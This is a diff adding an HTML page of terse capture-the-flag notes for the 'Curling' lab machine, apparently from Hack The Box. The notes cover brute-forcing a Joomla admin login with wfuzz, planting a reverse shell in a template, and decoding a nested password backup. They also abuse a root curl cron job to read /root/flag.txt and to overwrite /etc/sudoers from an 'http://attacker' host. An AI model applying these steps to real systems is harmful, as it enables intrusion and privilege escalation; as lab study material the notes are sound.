@@ -1,0 +1,44 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Curling - Cewl Joomla PHP Curl Redirect</title>
+</head><body>In source code, we see: secret.txt, which contains some encoded(?) data<br/>
+It's base64...gives us: Curling2018!<br/>
+<br/>
+See authors: floris<br/>
+wfuzz it: wfuzz --hl 114 -w cewl.out -d 'username=FUZZ&amp;password=Curling2018%21&amp;option=com_login&amp;task=login&amp;return=&lt;random_numbers_here&gt;=1' -c -b '&lt;num&gt;; &lt;num&gt;' -p 127.0.0.1:8080 http://10.10.10.150/administrator/index.php<br/>
+<br/>
+Notice that responses have a CSRF token that we'll need to grab along with cookie data<br/>
+<br/>
+Floris:Curling2018!<br/>
+Upload/Edit reverse shell on an in-use page ('protostar' template is in-use)<br/>
+<br/>
+<br/>
+See /home/floris, password_backup<br/>
+Looks like it could be hex: xxd -r password_backup &gt; out<br/>
+file out: bzip2<br/>
+bzcat out &gt; out1<br/>
+file out1: gzip<br/>
+zcat out1 &gt; out2<br/>
+file out2: bzip2<br/>
+bzcat out2 &gt; out3<br/>
+file out3: POSIX tar archive<br/>
+tar -xf out3 &gt; out4<br/>
+password.txt<br/>
+<br/>
+Now we have Floris' password. Can su or ssh as Floris<br/>
+<br/>
+input_file will read a url as the root user and put it in report<br/>
+<br/>
+local files: url = "file:///root/flag.txt"<br/>
+Read the crontab: curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report<br/>
+<br/>
+Overwrite files:<br/>
+url = "http://attacker/sudoers"<br/>
+output = "/etc/sudoers"<br/>
+<br/>
+Ensure the attacker sudoers file has <br/>
+floris ALL=(ALL:ALL) ALL<br/>
+<br/>
+[pspy]() | process spy, python program. much more detailed than procmon.sh</body></html>
